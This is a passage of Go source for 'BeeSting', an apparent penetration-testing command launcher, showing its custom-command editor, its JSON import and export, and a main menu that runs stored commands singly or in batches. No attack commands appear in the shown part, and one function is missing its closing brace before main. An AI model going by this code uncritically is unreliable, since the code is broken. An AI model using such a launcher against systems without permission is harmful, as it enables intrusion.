			
			(*customCommands)[num-1] = editCustomCommand((*customCommands)[num-1])
			err = saveCustomCommands(*customCommands)
			if err != nil {
				fmt.Printf("[!] Error saving: %v\n", err)
			} else {
				fmt.Println("\n[✓] Custom command updated successfully!")
			}
			
		case "4":
			// Delete custom command
			if len(*customCommands) == 0 {
				fmt.Println("\n[!] No custom commands to delete")
				break
			}
			
			fmt.Println("\n[+] Custom commands:")
			for i, cmd := range *customCommands {
				fmt.Printf("    [%d] %s - %s\n", i+1, cmd.Category, cmd.Description)
			}
			
			fmt.Print("\n[>] Enter command number to delete: ")
			numStr, _ := reader.ReadString('\n')
			numStr = strings.TrimSpace(numStr)
			num, err := strconv.Atoi(numStr)
			
			if err != nil || num < 1 || num > len(*customCommands) {
				fmt.Println("[!] Invalid command number")
				break
			}
			
			fmt.Printf("\n[?] Delete command '%s'? (y/n): ", (*customCommands)[num-1].Description)
			confirm, _ := reader.ReadString('\n')
			confirm = strings.ToLower(strings.TrimSpace(confirm))
			
			if confirm == "y" || confirm == "yes" {
				*customCommands = append((*customCommands)[:num-1], (*customCommands)[num:]...)
				err = saveCustomCommands(*customCommands)
				if err != nil {
					fmt.Printf("[!] Error saving: %v\n", err)
				} else {
					fmt.Println("\n[✓] Custom command deleted successfully!")
				}
			} else {
				fmt.Println("[!] Deletion cancelled")
			}
			
		case "5":
			// Export custom commands
			if len(*customCommands) == 0 {
				fmt.Println("\n[!] No custom commands to export")
				break
			}
			
			fmt.Print("\n[>] Enter export file name (e.g., my_commands.json): ")
			fileName, _ := reader.ReadString('\n')
			fileName = strings.TrimSpace(fileName)
			
			if fileName == "" {
				fileName = "beesting_export.json"
			}
			
			data, _ := json.MarshalIndent(*customCommands, "", "  ")
			err := ioutil.WriteFile(fileName, data, 0644)
			if err != nil {
				fmt.Printf("[!] Error exporting: %v\n", err)
			} else {
				fmt.Printf("\n[✓] Exported %d commands to %s\n", len(*customCommands), fileName)
			}
			
		case "6":
			// Import custom commands
			fmt.Print("\n[>] Enter import file name: ")
			fileName, _ := reader.ReadString('\n')
			fileName = strings.TrimSpace(fileName)
			
			data, err := ioutil.ReadFile(fileName)
			if err != nil {
				fmt.Printf("[!] Error reading file: %v\n", err)
				break
			}
			
			var importedCommands []Command
			err = json.Unmarshal(data, &importedCommands)
			if err != nil {
				fmt.Printf("[!] Error parsing file: %v\n", err)
				break
			}
			
			fmt.Printf("\n[+] Found %d commands in file\n", len(importedCommands))
			fmt.Print("[?] Append to existing commands? (y/n): ")
			append_choice, _ := reader.ReadString('\n')
			append_choice = strings.ToLower(strings.TrimSpace(append_choice))
			
			if append_choice == "y" || append_choice == "yes" {
				*customCommands = append(*customCommands, importedCommands...)
			} else {
				*customCommands = importedCommands
			}
			
			err = saveCustomCommands(*customCommands)
			if err != nil {
				fmt.Printf("[!] Error saving: %v\n", err)
			} else {
				fmt.Printf("\n[✓] Imported successfully! Total commands: %d\n", len(*customCommands))
			}
			
		case "7":
			return
			
		default:
			fmt.Println("\n[!] Invalid choice")
		}
		
		fmt.Print("\n[>] Press Enter to continue...")
		reader.ReadString('\n')
	}

func main() {
	printBanner()
	
	// Load built-in commands
	builtInCommands := getCommands()
	
	// Load custom commands
	customCommands := loadCustomCommands()
	
	// Merge commands
	allCommands := append(builtInCommands, customCommands...)
	
	fmt.Printf("\n[+] Loaded %d built-in commands\n", len(builtInCommands))
	if len(customCommands) > 0 {
		fmt.Printf("[+] Loaded %d custom commands\n", len(customCommands))
	}
	fmt.Printf("[+] Total commands available: %d\n", len(allCommands))
	fmt.Println("[+] Remember: Use these commands only on systems you have permission to test!")
	
	reader := bufio.NewReader(os.Stdin)
	
	for {
		displayMenu()
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)
		
		switch choice {
		case "1":
			showAllCommands(allCommands)
		case "2":
			filterByCategory(allCommands)
		case "3":
			searchByKeyword(allCommands)
		case "4":
			runCommand(allCommands)
		case "5":
			batchExecution(allCommands)
		case "6":
			customCommandManager(&customCommands)
			// Reload all commands after custom command changes
			allCommands = append(builtInCommands, customCommands...)
		case "7":
			fmt.Println("\n[+] Thank you for using BeeSting! Stay ethical! 🐝\n")
			os.Exit(0)
		default:
			fmt.Println("\n[!] Invalid choice. Please try again.")
		}
		
		fmt.Print("\n[>] Press Enter to continue...")
		reader.ReadString('\n')
	}
}
